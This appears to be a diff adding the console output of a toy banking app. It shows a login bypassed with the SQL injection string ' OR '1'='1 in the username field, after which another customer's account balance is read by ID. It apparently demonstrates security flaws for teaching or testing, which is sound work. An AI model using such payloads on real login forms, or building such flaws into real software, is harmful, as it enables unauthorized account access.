@@ -1,0 +1,11 @@
+=== Simple Online Banking ===
+Username: ' OR '1'='1
+Password: x
+[LOG]: Attempted login with Password: x
+
+Welcome, alice!
+1. Check Balance
+2. Transfer Money
+Choice: 1
+Enter Account ID to check balance: 2
+Account Data: ('bob', 10000.0)
